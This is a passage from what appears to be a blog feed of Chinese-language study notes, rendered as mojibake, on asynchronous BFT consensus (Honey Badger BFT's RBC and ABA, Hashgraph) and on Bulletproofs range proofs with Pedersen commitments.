rel="noopener">https://learnblockchain.cn/article/2494#ACSâ€”Asynchronous-Common-Subset-</a>ä¸€æ–‡ä¸­è¯¥ç‚¹ç›¸å…³çš„æè¿°ä½œå‡ºå‹˜è¯¯ï¼š</p><p>è‹¥åœ¨$N-f$ä¸ª$RBC$å®ä¾‹æˆåŠŸåå°±å°†å…¶ä»–$ABA$è¾“å…¥ç½®0ï¼Œå°†å¯èƒ½å‡ºç°ä»¥ä¸‹æƒ…å†µï¼š</p><p>&emsp;&emsp;åœ¨è¯šå®èŠ‚ç‚¹$\mathcal{P}_i$ä¸Šï¼Œæœ‰è¯šå®èŠ‚ç‚¹$\mathcal{P}_j$å¯¹åº”çš„$RBC_{j}$è¿˜æœªæ‰§è¡ŒæˆåŠŸï¼Œä½†å·²æœ‰å…¶ä»–$N-f$ä¸ªè¯šå®èŠ‚ç‚¹å¯¹åº”çš„$RBC$æ‰§è¡ŒæˆåŠŸâ¡$ABA_j$çš„è¾“å…¥ç½®0ï¼›</p><p>&emsp;&emsp;å‡å¦‚å­˜åœ¨è‹¥å¹²è¯šå®èŠ‚ç‚¹æœ¬åœ°è¿è¡Œçš„$RBC_j$å‡ºç°ä¸Šè¿°$\mathcal{P}_i$çš„æƒ…å†µï¼Œå¯¼è‡´$ABA_j$çš„å…±è¯†è¿‡ç¨‹æ”¶ä¸åˆ°$N-f$æ¡$Aux(1)$â¡$ABA_j$çš„è¾“å‡ºä¸º0ï¼ˆ<strong>æœ¬åº”è¯¥ä¸º1</strong>ï¼‰ï¼›</p><p>&emsp;&emsp;<strong>ç”±äºæ¯ä¸ªè¯šå®èŠ‚ç‚¹æœ¬åœ°$N-f$ä¸ª$RBC$å®ä¾‹æ‰§è¡ŒæˆåŠŸçš„é¡ºåºå¯èƒ½ä¸åŒ</strong>ï¼Œå› æ­¤è€ƒè™‘æœ€åæƒ…å†µï¼Œå¯èƒ½å‡ºç°è®ºæ–‡ä¸­è¯´çš„â€the resulting bit vector could be <strong>empty</strong>â€œ</p><p>å›åˆ°Figure_4çš„å®ç°ï¼Œè‹¥æ”¹ä¸ºåœ¨$N-f$ä¸ª$ABA$å®ä¾‹æˆåŠŸï¼ˆè¾“å‡º1ï¼‰åï¼Œå†å°†å…¶ä½™æœªå¼€å§‹æ‰§è¡Œçš„$ABA$è¾“å…¥ç½®0ï¼Œåˆ™<strong>è‡³å°‘èƒ½ä¿è¯$size(resulting\ bit\ vector)$ä¸º$N-f$</strong>ã€‚ä¸”å¦‚æœä¸è€ƒè™‘æœ€åæƒ…å†µï¼ˆå³æŸä¸ªè¯šå®èŠ‚ç‚¹å¯¹åº”çš„$RBC$åœ¨å¾ˆå¤šèŠ‚ç‚¹ä¸Šç›´åˆ°$N-f$ä¸ª$ABA$å‡å·²è¾“å‡º1è¿˜æœªæ‰§è¡ŒæˆåŠŸï¼‰ï¼Œåˆ™å»¶è¿Ÿè¾ƒå¤§çš„æƒ…å†µä¸‹å°†å‡ºç°ä¸‹è¿°æƒ…å†µï¼ˆä»èƒ½output 1ï¼‰ï¼š</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-04_15-44-28.png" alt></p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-04_15-56-51.png" alt></p></li><li><p>å½“æ‰€æœ‰$ABA$å®ä¾‹æ‰§è¡Œå®Œæˆåï¼Œè¾“å‡ºä¸º1çš„$ABA$ä¸‹æ ‡æ˜ å°„åˆ°æœ€ç»ˆçš„<em>enc_proposed</em>é›†åˆï¼›</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_7_Figure_4.png" alt="Figure_4"></p><h4 id="RBC-Reliable-Broadcast"><a href="#RBC-Reliable-Broadcast" class="headerlink" title="RBC (Reliable Broadcast)"></a>RBC (Reliable Broadcast)</h4><p>RBCåè®®å¯ä¿è¯å°†æ¶ˆæ¯å¯é åœ°å‘é€è‡³ç½‘ç»œä¸­çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚</p><p>Honey Badger BFTä¸­çš„RBCåè®®è®¾è®¡å¦‚ä¸‹ï¼š</p><ol><li><p>æœ¬åœ°è¾“å…¥ï¼ŒåŸºäº$(N-2f,N)$çº åˆ ç è¿›è¡Œåˆ†å‰²ï¼Œå¹¶è®¡ç®—Nä»½å¶èŠ‚ç‚¹$\{s_j\}_N$å¯¹åº”çš„Merkle Root $h$ï¼Œå‘èŠ‚ç‚¹$\mathcal{P}_j$å‘é€$VAL(h,b_j,s_j)$</p><p>å…¶ä¸­$VAL$æ˜¯æ¶ˆæ¯ç±»å‹åï¼Œ$b_j$ä¸ºMerkle Treeä»æ ¹åˆ°$s_j$çš„å¯¹åº”åˆ†æ”¯ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/0_EBENZgjKN5XMEJ8m.png" style="zoom:33%;"></p><blockquote><p>If we would receive the block <em>L4,</em> we would only need <em>Hash 1â€“0</em> and <em>Hash 0</em> to verify that block <em>L4</em> is valid for the root hash.</p></blockquote></li><li><p>æ”¶åˆ°$VAL$åŒ…åå¹¿æ’­å¯¹åº”$ECHO$åŒ…ï¼›</p></li><li><p>æ”¶åˆ°$ECHO$åŒ…åæ ¡éªŒMerkle Treeçš„åˆ†æ”¯ï¼Œä¸åˆæ³•åˆ™ä¸¢å¼ƒï¼›</p></li><li><p>å½“æ”¶é›†æ»¡$N-f$ï¼ˆi.e. $2f+1$ï¼‰ä¸ªåˆæ³•$ECHO$åŒ…åï¼Œä»ä»»æ„$f+1$ä¸ªæ¢å¤å‡ºå®Œæ•´çš„$N$ä¸ªå¶èŠ‚ç‚¹$\{s_j^{â€˜}\}$ï¼Œå¹¶éªŒè¯Merkle Rootæ˜¯å¦ä¸€è‡´ï¼Œè‹¥ä¸€è‡´åˆ™å¹¿æ’­$READY$åŒ…ï¼›</p><p><strong>Q: ä¸ºä»€ä¹ˆçº åˆ ç é‡‡ç”¨$f+1$ï¼ˆi.e. $N-2f$ï¼‰ï¼Œè®ºæ–‡ä¸­æš‚æœªæ‰¾åˆ°è¯´æ˜</strong></p></li><li><p>å¯¹äº<strong>å»¶è¿Ÿè¾ƒå¤§</strong>çš„èŠ‚ç‚¹ï¼Œè‹¥åœ¨æ”¶åˆ°$N-f$ä¸ªåˆæ³•$ECHO$åŒ…å‰ï¼Œå…ˆæ”¶åˆ°äº†$f+1$ä¸ª$READY$åŒ…ï¼Œåˆ™è¯´æ˜è‡³å°‘ç”±ä¸€ä¸ªè¯šå®èŠ‚ç‚¹å‘å‡ºï¼Œå°†åŒæ ·å¹¿æ’­$READY$åŒ…ï¼›</p></li><li><p>ç­‰å¾…æ”¶åˆ°$2f+1$ä¸ª$READY$åŒ…ï¼Œè‹¥å·²æ”¶åˆ°$N-2f$ä¸ªåˆæ³•$ECHO$åŒ…ï¼Œåˆ™æ¢å¤å‡ºå¯¹åº”å®Œæ•´è¾“å…¥ï¼Œå¦åˆ™ç»§ç»­ç­‰å¾…è¶³å¤Ÿçš„$ECHO$åŒ…ï¼›</p></li></ol><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_6_Figure_2.png" alt="Figure_2"></p><h4 id="ABA-Asynchronous-Binary-Agreement"><a href="#ABA-Asynchronous-Binary-Agreement" class="headerlink" title="ABA (Asynchronous Binary Agreement)"></a>ABA (Asynchronous Binary Agreement)</h4><p>$ABA$åè®®ï¼ˆå¦‚å›¾ç¤ºï¼‰å¯¹<strong>å•ä¸ªbit</strong>ä½œå‡ºå…±è¯†ï¼ˆr means the round numberï¼‰</p><p>HB-BFTä½¿ç”¨çš„ABAåè®®å‚è€ƒè‡ª</p><blockquote><p>A. Mostefaoui, H. Moumen, and M. Raynal. Signature-free asynchronous byzantine consensus with t&lt; n/3 and o (n 2) messages. In Proceedings of the 2014 ACM symposium on Principles of distributed computing, pages 2â€“9. ACM, 2014.</p></blockquote><p>åˆå§‹åŒ–$est_{0}$ä¸ºè¯¥$ABA$å®ä¾‹çš„è¾“å…¥ï¼Œè¿›å…¥ä¸‹é¢çš„å¾ªç¯ï¼š</p><ol><li><p>å¹¿æ’­$BVAL_{r}(est_r)$ï¼›</p><p>$BVAL$ probably means BIT_VALUE</p></li><li><p>ä»¤$bin_values_r$ä¸ºç©ºé›†ï¼›</p></li><li><p>å½“æ”¶åˆ°æ¥è‡ª$f+1$ä¸ªèŠ‚ç‚¹çš„$BVAL_r(b)$æ—¶ï¼Œè¯æ˜è‡³å°‘ç”±ä¸€ä¸ªè¯šå®èŠ‚ç‚¹å‘å‡ºï¼Œè‹¥æœªå‘é€è¿‡$BVAL_r(b)$ï¼Œåˆ™å¹¿æ’­è¯¥æ¶ˆæ¯ï¼›</p></li><li><p>å½“æ”¶åˆ°æ¥è‡ª$2f+1$ä¸ªèŠ‚ç‚¹çš„$BVAL_r(b)$æ—¶ï¼Œå°†$b$åŠ å…¥é›†åˆ$bin_values_r$ï¼›</p></li><li><p>å½“$bin_values_r$ä¸ä¸ºç©ºé›†æ—¶ï¼š</p><ul><li><p>å¹¿æ’­$AUX_r(w)$ï¼Œ$w\in bin_values_r$ï¼›</p></li><li><p>ç­‰å¾…ï¼Œç›´åˆ°æ”¶åˆ°$n-f$(i.e. $2f+1$)æ¡$AUX_r$æ¶ˆæ¯ï¼ˆå…¶ä¸­åŒ…å«çš„å€¼æ„æˆé›†åˆ$vals$ï¼‰ï¼Œéœ€è¦æ»¡è¶³$vals\sub bin_values_r$ï¼›</p></li></ul><p>æ³¨æ„(5)åœ¨ç›‘å¬ç­‰å¾…æ—¶ï¼Œ(3)(4)ä»åœ¨è¿è¡Œï¼Œå› æ­¤$bin_values_r$å¯èƒ½å˜åŒ–ï¼ˆå­˜åœ¨éƒ¨åˆ†$AUX_r$æ¶ˆæ¯æºå¸¦çš„å€¼æ»¡è¶³$\in bin_values_r$ï¼Œè¢«åŠ å…¥è®¡æ•°ï¼‰â¬… è§£é‡Šäº†åŸæ–‡ä¸ºä½•è¯´â€this condition may be triggered upon arrival of either an AUX or an BVALâ€ï¼›</p><p>ä½†(5)ä¸ä¼šéšç€$bin_values_r$çš„å˜åŒ–å†æ¬¡å¹¿æ’­ â¬… æ¯ä¸ªè¯šå®èŠ‚ç‚¹åªä¼šé€‰æ‹©ä¸€ä¸ª$w$ï¼Œå¹¿æ’­$AUX_r(w)$ï¼›</p><ul><li><p>è·å–éšæœºæºsï¼ˆè§Figure_12ï¼‰</p></li><li><p>è‹¥$\mid vals\mid=2$ï¼Œä»¤ä¸‹ä¸€è½®çš„$est_{r+1}=s$ï¼›</p><p>è‹¥$\mid vals\mid=1,vals=\{v\}$ï¼Œä»¤$est_{r+1}=v$ï¼Œè‹¥$v=s\%2$ï¼Œè¾“å‡º$v$ï¼Œå¦åˆ™ç»§ç»­å¾ªç¯ï¼›</p></li></ul></li></ol><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_14_Figure_11.png" alt="Figure_11"></p><p>ABAçš„æ­£ç¡®æ€§è¯æ˜å¯ä»¥ç§»æ­¥<a href="https://zhuanlan.zhihu.com/p/46274211" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/46274211</a></p><p>PBFTç­‰å¼±åŒæ­¥å…±è¯†ç®—æ³•ä¸­è‹¥æ— æ³•æ”¶åˆ°ç›¸åŒVOTEçš„$2f+1$æ¡ä¿¡æ¯ï¼ˆå‡è®¾$f$ä¸ªæ‹œå åº­èŠ‚ç‚¹å‡ä¸å‘æ¶ˆæ¯ï¼Œè€Œ$2f+1$ä¸ªè¯šå®èŠ‚ç‚¹é—´å­˜åœ¨ä¸ä¸€è‡´VOTEğŸ‘ˆä¸‹é¢è§£é‡Šï¼‰ï¼Œåˆ™å¼•å…¥å®šæ—¶å™¨timeræ¥è§£å†³æ— æ³•è¾¾æˆå…±è¯†çš„é—®é¢˜ï¼›</p><p>è¿™é‡Œè§£é‡Šä¸€ä¸‹ä¸ºä»€ä¹ˆå­˜åœ¨è¯šå®èŠ‚ç‚¹åˆ†æ­§ğŸ‘‰e.g. PBFTä¸­leaderæœ¬èº«ä½œæ¶ï¼Œå‘ç»™ä¸€éƒ¨åˆ†èŠ‚ç‚¹èƒ½é€šè¿‡æ ¡éªŒçš„åŒºå—ï¼Œè€Œå‘ç»™å¦ä¸€éƒ¨åˆ†èŠ‚ç‚¹ä¸èƒ½é€šè¿‡æ ¡éªŒçš„åŒºå—</p><p>è€ŒHoney Badger BFTå¼‚æ­¥å…±è¯†ç®—æ³•ä¸å­˜åœ¨timerï¼Œå¹¶å¼•å…¥äº†éšæœºæºæ¥è§£å†³ä¸Šè¿°é—®é¢˜ï¼Œä½¿å¾—å…±è¯†ä¸ä¼šåœæ»ï¼ˆå¤±å»æ´»æ€§ï¼‰ï¼›</p><p>HB-BFTä¸­éšæœºæºé‡‡ç”¨çš„æ–¹æ¡ˆæ˜¯å¯¹Coinsâ€™ sidçš„(n, f+1)é˜ˆå€¼ç­¾åï¼ˆâ¡ fä¸ªæ‹œå åº­èŠ‚ç‚¹ä¸å¯èƒ½å¾—åˆ°åˆæ³•ç­¾åï¼‰ï¼›</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/53841f31b5ed66280d2b3adc62ef9db5_14_Figure_12.png" alt="Figure_12"></p><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><ul><li>The Honey Badger of BFT Protocols (paper)</li><li>Signature-Free Asynchronous Byzantine Consensus with t &lt; n/3 and O(n 2 ) Messages (paper)</li><li><a href="https://learnblockchain.cn/article/2494#RBC--Reliable-Broadcast-" target="_blank" rel="noopener">https://learnblockchain.cn/article/2494#RBCâ€”Reliable-Broadcast-</a></li></ul><h3 id="Hashgraph"><a href="#Hashgraph" class="headerlink" title="Hashgraph"></a>Hashgraph</h3><blockquote><p>Hashgraph - a data structure that records who gossiped to whom, and in what order.</p></blockquote><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/8b92a19756c541467b3e9ee656a742e3_4_Figure_1.png" alt></p><ul><li><p>HashgraphåŸºç¡€æ•°æ®å•å…ƒä¸ºeventï¼ˆåŒ…å«TransactionSetã€Timestampå’Œä¸¤ä¸ªçˆ¶eventçš„HashValueï¼‰</p></li><li><p>Hashgraphç½‘ç»œä¸‹ä½¿ç”¨gossipåè®®è¿›è¡Œé€šä¿¡ï¼Œæ¯ä¸ªèŠ‚ç‚¹ä¸åœéšæœºé€‰æ‹©å…¶ä»–èŠ‚ç‚¹sync<strong>â€œå·±æ–¹å·²çŸ¥ä½†å¯¹æ–¹æœªçŸ¥â€</strong>çš„eventsï¼Œreceiveræ”¶åˆ°syncååˆ™åˆ›å»ºè‡ªå·±çš„æœ€æ–°eventï¼ˆçˆ¶hashåˆ†åˆ«æŒ‡å‘<code>self-parent</code>å’Œsenderçš„æœ€æ–°eventï¼‰ï¼Œå¹¶åŒæ ·å‘éšæœºèŠ‚ç‚¹sync</p><p>å› æ­¤å®é™…ä¸Šä¼ è¾“çš„æ˜¯<em>hashgraph itself</em>ï¼Œå³gossip about gossipåè®®ï¼š</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/Snipaste_2021-12-13_15-27-51.jpg" alt></p></li><li><p>Hashgraphå°†eventæŒ‰roundåˆ’åˆ†ï¼Œé¦–å…ˆå¼•å…¥å‰ç½®æ¦‚å¿µï¼š</p><ul><li>See: å¦‚æœevent wå­˜åœ¨åˆ°event xçš„é€šè·¯ï¼ˆæœ‰å‘è¾¹ï¼‰ï¼Œåˆ™ç§°w see x</li><li>Strongly see: å¦‚æœç½‘ç»œèŠ‚ç‚¹æ€»æ•°ä¸ºnï¼Œevent wå¯è§è¶…è¿‡2n/3ä¸ª<strong>ä¸åŒ</strong>èŠ‚ç‚¹çš„eventï¼ˆä¸”è¿™äº›eventå‡å¯è§event xï¼‰ï¼Œåˆ™ç§°w strongly see x</li></ul><p>å¯¹äºHashgraphä¸‹çš„èŠ‚ç‚¹ï¼Œæ¯ä¸€roundä¸­å…¶åˆ›å»ºçš„ç¬¬ä¸€ä¸ªeventè¢«è®°ä½œ<strong>witness</strong>ï¼ˆè§è¯äººï¼‰</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/image-20211214170712208.png" alt></p><p>æ¯ä¸€ä¸ªeventéƒ½å­˜åœ¨å¯¹åº”çš„<strong>round created number</strong>ï¼š</p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/8b92a19756c541467b3e9ee656a742e3_8_Figure_3.png" alt></p><p><img src= "/img/loading.gif" data-src="/2021/12/06/Research-on-aBFT/image-20211214171338852.png" alt></p><p>è‹¥event wçš„çˆ¶eventä¸­æœ€å¤§roundä¸ºrï¼Œåˆ™å…¶round created numberç›¸åº”çš„ä¸ºræˆ–r+1ï¼ˆ<strong>r+1å½“ä¸”ä»…å½“wèƒ½strongly seeè¶…è¿‡2n/3ä¸ªä¸åŒèŠ‚ç‚¹ä¸‹round rçš„witness</strong>â¡æˆä¸ºæ–°ä¸€è½®witnessï¼‰</p></li><li></li></ul><h4 id="Reference-1"><a href="#Reference-1" class="headerlink" title="Reference"></a>Reference</h4><ul><li>THE SWIRLDS HASHGRAPH CONSENSUS ALGORITHM: FAIR, FAST, BYZANTINE FAULT TOLERANCE (paper)</li></ul><h3 id="Dumbo-BFT"><a href="#Dumbo-BFT" class="headerlink" title="Dumbo BFT"></a>Dumbo BFT</h3>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Survey of Blockchain consensus algorithm</title>
      <link href="/2021/11/12/Survey-of-Blockchain-consensus-algorithm/"/>
      <url>/2021/11/12/Survey-of-Blockchain-consensus-algorithm/</url>
      
        <content type="html"><![CDATA[<h3 id="Report"><a href="#Report" class="headerlink" title="Report"></a>Report</h3><div class="row">    <embed src="Survey_of_Blockchain_consensus_algorithm.pdf" width="100%" height="550" type="application/pdf"></div>]]></content>
      
      
      <categories>
          
          <category> Blockchain </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Bullet Proofs</title>
      <link href="/2021/10/31/Bullet-Proofs/"/>
      <url>/2021/10/31/Bullet-Proofs/</url>
      
        <content type="html"><![CDATA[<h3 id="Pedersen-Commitment"><a href="#Pedersen-Commitment" class="headerlink" title="Pedersen Commitment"></a>Pedersen Commitment</h3><p>$Com(v)=v\cdot B+\tilde{v}\cdot\tilde{B}$ï¼Œå…¶ä¸­$B,\tilde{B}$ä¸ºæ¤­åœ†æ›²çº¿ä¸Šçš„ä¸¤ä¸ªåŸºç‚¹ï¼Œ$v$æ˜¯éœ€è¦æ‰¿è¯ºçš„ç§˜å¯†æ•°ï¼Œ$\tilde{v}$ä¸ºï¼ˆéšæœºï¼‰ç›²åŒ–å› å­ã€‚</p><p>å…·å¤‡åŒæ€åŠ æ³•ç‰¹æ€§ï¼Œå³ï¼š</p><p>$Com(v_1)+Com(v_2)=v_1\cdot B+\tilde{v_1}\cdot\tilde{B}+v_2\cdot B+\tilde{v_2}\cdot\tilde{B}=(v_1+v_2)\cdot B+(\tilde{v_1}+\tilde{v_2})\cdot\tilde{B}=Com(v_1+v_2)$</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211101220609819.png" alt></p><p>åŒæ€ä¿è¯äº†UTXOäº¤æ˜“ä¸­çš„Input/Outputæ€»å’Œå‡æ˜¯Pedersen Commitment</p><p>â­<strong>(Pedersen Vector Commitment)</strong></p><p>$\textbf{B}=(B_1,â€¦,B_n)\in\mathbb{G}^n$</p><p>$Com(\textbf{v}=(v_1,â€¦,v_n);\tilde{v})=\langle\textbf{v},\textbf{B}\rangle+\tilde{v}\tilde{B}$</p><h3 id="Bullet-Proofs"><a href="#Bullet-Proofs" class="headerlink" title="Bullet Proofs"></a>Bullet Proofs</h3><h4 id="Notation"><a href="#Notation" class="headerlink" title="Notation"></a>Notation</h4><p>å°å†™å­—æ¯$a,b,c$è¡¨ç¤º$\mathbb{Z}_p$ä¸‹çš„æ ‡é‡ï¼Œå¤§å†™å­—æ¯$G,H,P,Q$è¡¨ç¤ºç¾¤$\mathbb{G}$ä¸‹çš„å…ƒç´ ã€‚å‘é‡è¢«ç²—ä½“è¡¨ç¤ºï¼Œä¾‹å¦‚$\textbf{a},\textbf{G}$ã€‚</p><p>ç”¨åˆ°çš„Pedersen Vector Commitmentå®šä¹‰ä¸ºï¼š</p><script type="math/tex; mode=display">Com(\textbf{a}_L,\textbf{a}_R)=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{a}_R,\textbf{H}\rangle+\tilde{a}\tilde{B}</script><p>å…¶ä¸­$\textbf{G},\textbf{H}\in\mathbb{G}^n$</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211101225906030.png" alt></p><h4 id="Inner-Product-Range-Proof"><a href="#Inner-Product-Range-Proof" class="headerlink" title="Inner-Product Range Proof"></a>Inner-Product Range Proof</h4><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211101222443822.png" alt></p><p>å¹¶å°†åŸè®ºæ–‡ä¸­çš„ä¹˜æ³•ç¾¤ä»¥åŠ æ³•ç¾¤ä»£æ›¿ï¼Œå¦‚ä¸‹ï¼š</p><p>$\{(B,\tilde{B}\in\mathbb{G},V,n\ ;\ v,\tilde{v}\in\mathbb{Z}_p):V=vB+\tilde{v}\tilde{B}\ \wedge\ v\in[0,2^n-1]\}$</p><p>ä»¤$\textbf{a}_L=(a_1,â€¦,a_n)\in\{0,1\}^n$è¡¨ç¤ºç”±$v$å„ä¸ªæ¯”ç‰¹ä½ç»„æˆçš„å‘é‡ï¼Œå³$\langle\textbf{a}_L,\textbf{2}^n\rangle=v$ â† â‘ </p><p>è¿˜éœ€è¦ä¿è¯$\textbf{a}_L$ä»…åŒ…å«$\{0,1\}$ï¼Œå› æ­¤ä»¤$\textbf{a}_R=\textbf{a}_L-\textbf{1}^n$ â† â‘¡ï¼Œæœ‰$\textbf{a}_L\circ\textbf{a}_R=\textbf{0}^n$ â† â‘¢</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102163505168.png" alt></p><p>åšä»¥ä¸‹æ•´ç†ï¼š</p><script type="math/tex; mode=display">\langle\textbf{a}_L,\textbf{2}^n\rangle=v\ \wedge\langle\textbf{a}_L-\textbf{1}-\textbf{a}_R,\textbf{y}^n\rangle=0\ \wedge\ \langle\textbf{a}_L,\textbf{a}_R\circ\textbf{y}^n\rangle=0</script><p>å¯è¿›ä¸€æ­¥ï¼Œä»¤verifieré€‰å–éšæœº$z\in\mathbb{Z}_p$ï¼Œå°†ä¸Šè¿°è½¬ä¸ºä¸€ä¸ªçº¦æŸï¼š</p><script type="math/tex; mode=display">z^2\cdot v=z^2\langle\textbf{a}_L,\textbf{2}^n\rangle+z\langle\textbf{a}_L-\textbf{1}-\textbf{a}_R,\textbf{y}^n\rangle+\langle\textbf{a}_L,\textbf{a}_R\circ\textbf{y}^n\rangle</script><p>å°†å…¶è½¬åŒ–ä¸ºå‰é¢è®ºæ–‡ä¸­æåˆ°çš„â€a single inner-product constraintâ€ï¼ˆå¹¶ä»¤$\textbf{a}_L$åªå‡ºç°åœ¨å·¦ä¾§ï¼Œ$\textbf{a}_R$åªå‡ºç°åœ¨å³ä¾§ï¼Œä¸å«witnessçš„é¡¹åˆå¹¶å³ä¸º$\delta$ï¼‰ï¼š</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102181623065.png" alt></p><p>å°†æ­¤æ—¶å†…ç§¯çš„å·¦ä¾§è®°ä½œ<em>unblinded l(X)</em>ï¼Œå³ä¾§è®°ä½œ<em>unblinded r(X)</em></p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102171502891.png" alt></p><p>ä¸‹é¢æ˜¯ç›²åŒ–åæ–°å®šä¹‰çš„å¤šé¡¹å¼$l(X),r(X)$ï¼Œä»¥åŠäºŒæ¬¡å¤šé¡¹å¼$t(X)$ï¼š</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211102171740440.png" alt></p><p>Proveréœ€è¦è¯æ˜$t_0=z^2v+\delta(y,z)$ï¼Œ$l(X),r(X)$æ­£ç¡®ï¼Œä»¥åŠ$t(X)=\langle l(X),r(X)\rangle$</p><hr><p>$\mathcal{P}$ computes:</p><p>$\quad\tilde{t_1},\tilde{t_2}\longleftarrow\mathbb{Z}_p$</p><p>$\quad T_i=t_1B+\tilde{t_1}\tilde{B}\in\mathbb{G},\quad i=\{1,2\}$</p><p>$\mathcal{P}\rightarrow\mathcal{V}:T_1,T_2$</p><p>$\mathcal{V}:x\longleftarrow\mathbb{Z}^{*}_{p}\quad(\mathbb{Z}_{p}\backslash\{0\})$</p><p>$\mathcal{V}\rightarrow\mathcal{P}:x$&emsp;// a random challenge</p><p>$\mathcal{P}$ computes:</p><p>$\quad\textbf{l}=l(x)=\textbf{a}_L+\textbf{s}_L\cdot x-z\cdot\textbf{1}\in\mathbb{Z}^{n}_{p}$</p><p>$\quad\textbf{r}=r(x)=\textbf{y}^{n}\circ(\textbf{a}_R+\textbf{s}_R\cdot x+z\cdot\textbf{1})+z^2\cdot\textbf{2}^n\in\mathbb{Z}^{n}_{p}$</p><p>$\quad\textbf{t}=t(x)=\langle\textbf{l},\textbf{r}\rangle\in\mathbb{Z}_p$</p><p>$\quad\tilde{t}=z^2\cdot\tilde{v}+\tilde{t_1}\cdot x+\tilde{t_2}\cdot x^2\in\mathbb{Z}_p$&emsp;// blinding value for $\textbf{t}$</p><p>$\quad\tilde{e}=\tilde{a}+\tilde{s}\cdot x\in\mathbb{Z}_p$&emsp;// $\tilde{a},\tilde{s}$ blind $A,S$</p><p>$\mathcal{P}\rightarrow\mathcal{V}:\textbf{t},\tilde{t},\tilde{e},\textbf{l},\textbf{r}$</p><hr><p>è€Œæ›´åœ¨ä¸Šè¿°ï¼ˆåˆ†å‰²çº¿å†…ï¼‰æ­¥éª¤ä¹‹å‰ï¼Œè¿˜éœ€è¦å…ˆäºâ€$\mathcal{V}\rightarrow\mathcal{P}:challenge\ value\ y$â€ï¼Œ$\mathcal{P}\rightarrow\mathcal{V}:commitment\ A,S$ï¼š</p><p>$A=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{a}_R,\textbf{H}\rangle+\tilde{a}\tilde{B}$</p><p>$S=\langle\textbf{s}_L,\textbf{G}\rangle+\langle\textbf{s}_R,\textbf{H}\rangle+\tilde{s}\tilde{B}$</p><p><img src= "/img/loading.gif" data-src="/2021/10/31/Bullet-Proofs/image-20211103172058685.png" alt></p><p>ä½†éœ€è¦å¯¹å¤åˆå˜é‡$\textbf{y}^{n}\circ\textbf{a}_R,\textbf{y}^{n}\circ\textbf{s}_R$ä½œå‡ºæ‰¿è¯ºï¼Œä¸”</p><p>$Com(\textbf{a}_L,\textbf{a}_R,\tilde{a})=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{a}_R,\textbf{H}\rangle+\tilde{a}\tilde{B}=\langle\textbf{a}_L,\textbf{G}\rangle+\langle\textbf{y}^n\circ\textbf{a}_R,\textbf{y}^{-n}\circ\textbf{H}\rangle+\tilde{a}\tilde{B}$</p><p>å› æ­¤ä»¤$\textbf{Hâ€™}=\textbf{y}^{-n}\circ\textbf{H}$ï¼Œå³$H_i^{â€˜}=y^{-i+1}\cdot H_i,\quad i=1,â€¦,n$</p><p>ç”± <em>Verifier</em> å°†åŸcommitment A, Så˜å½¢ä¸ºå¯¹åº”$\textbf{Hâ€™}$ä»¥åŠå¤åˆå˜é‡çš„commitment</p><hr><p>All based on <em>ECDLP</em></p><p>$\textbf{t}B+\tilde{t}\tilde{B}\stackrel{?}{=}z^{2}V+\delta(y,z)B+T_1\cdot x+T_2\cdot x^2$&emsp;// â‘  check that $\textbf{t}=z^2v+\delta(y,z)+t_1x+t_2x^2$</p><p>$A+S\cdot x-z\langle\textbf{1},\textbf{G}\rangle+\langle z\textbf{y}^n+z^2\textbf{2}^n,\textbf{Hâ€™}\rangle-\tilde{e}\tilde{B}\stackrel{?}{=}\langle\textbf{l},\textbf{G}\rangle+\langle\textbf{r},\textbf{Hâ€™}\rangle$&emsp;// â‘¡ check that $l(X),r(X)$ are correct</p><p>$\textbf{t}\stackrel{?}{=}\langle\textbf{l},\textbf{r}\rangle$&emsp;// â‘¢ check that $t(X)=\langle l(X),r(X)\rangle$</p><hr><p>ä½†æ ¡éªŒâ‘¡â‘¢ï¼š<em>Prover</em>å’Œ<em>Verifier</em>ä¹‹é—´ç›´æ¥ä¼ è¾“$\textbf{l},\textbf{r}$ï¼Œå¯¼è‡´éœ€è¦$2n$ä¸ªæ ‡é‡çš„å¸¦å®½</p><h4 id="Logarithmic-Range-Proof"><a href="#Logarithmic-Range-Proof" class="headerlink" title="Logarithmic Range Proof"></a>Logarithmic Range Proof</h4><p>å†…ç§¯åè®®ä¸€èˆ¬ç”¨äºè¯æ˜ä»¥ä¸‹å…³ç³»ï¼š</p><script type="math/tex; mode=display">\{(\textbf{G},\textbf{H}\in\mathbb{G}^n,P\in\mathbb{G},c\in\mathbb{Z}_p;\ \textbf{a},\textbf{b}\in\mathbb{Z}^{n}_{p}):\ P=\textbf{aG}+\textbf{bH}\wedge 